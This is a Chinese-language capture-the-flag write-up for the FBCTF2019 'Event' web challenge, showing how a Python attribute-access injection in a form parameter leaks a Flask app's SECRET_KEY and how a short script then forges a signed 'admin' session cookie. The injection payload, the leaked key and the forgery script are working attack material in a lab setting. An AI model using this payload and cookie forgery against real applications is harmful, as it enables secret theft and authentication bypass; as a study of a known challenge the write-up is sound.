---
title: '[FBCTF2019]Event'
date: 2024-10-17 19:40:02
tags:
      - session伪造
categories: 刷题笔记
---

### [FBCTF2019]Event

![image-20241017200434931](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410172004038.png)

打开发现有个登录框，sql啥的试了一下没啥用，我们正常登录

我们在及源码里发现个/flag路由 ，我没猜测后台为flask框架

抓包发现有两个cookie，还有三个参数

<!--more-->

![image-20241017202208237](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410172022276.png)

我们对第一个cookie进行解密

![image-20241017202341121](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410172023149.png)

得到一串感觉没啥用的东西

我们对第二个cookie进行解密

![image-20241017202707588](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410172027614.png)

得到用户名10，猜测思路应该是找到提示，伪造cookie的user登陆为admin获得flag

```
通过测试，使用__class__或者__dict__在event_important处可以爆出相关内容
```

我们使用

```
__class__.__init__.__globals__[app].config
```

通过此获取配置文件

![image-20241017202735076](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410172027115.png)

我们得到密钥

```
'SECRET_KEY': 'fb+wwn!n1yo+9c(9s6!_3o#nqm&&_ej$tez)$_ik36n8d7o6mr#y'
```

flask原理：json->zlib->base64后的源字符串 . 时间戳 . hmac签名信息

![img](https://img2020.cnblogs.com/blog/1960851/202009/1960851-20200924204001106-289181411.png)

### exp

```
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

app = Flask(__name__)
app.secret_key = b'fb+wwn!n1yo+9c(9s6!_3o#nqm&&_ej$tez)$_ik36n8d7o6mr#y'

session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)

@app.route('/')
def index():
    print(session_serializer.dumps("admin"))

index()

//ImFkbWluIg.ZxED-g.IeMUk6ttojn-qxjcHDEpHpLNw0E
```

替换user，得到flag

![image-20241017203339231](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410172033277.png)
